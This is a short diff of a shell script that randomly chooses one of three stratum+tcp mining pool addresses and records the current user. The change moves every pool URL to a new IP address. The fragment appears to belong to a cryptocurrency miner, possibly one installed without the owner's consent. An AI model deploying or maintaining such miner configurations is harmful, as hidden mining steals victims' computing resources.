@@ -2,11 +2,11 @@
 NGAUNHIEN=$((RANDOM%3+1))
 CURUSER=$(whoami)
 if [ "$NGAUNHIEN" == "1" ]; then
-URL="stratum+tcp://74.208.94.205:5555"
+URL="stratum+tcp://61.14.237.206:5555"
 elif [ "$NGAUNHIEN" = "2" ]; then
-URL="stratum+tcp://74.208.94.205:3333"
+URL="stratum+tcp://61.14.237.206:3333"
 else 
-URL="stratum+tcp://74.208.94.205:7777"
+URL="stratum+tcp://61.14.237.206:7777"
 fi
 NGAUNHIEN2=$((RANDOM%3+1))
 if [ "$NGAUNHIEN2" == "1" ]; then
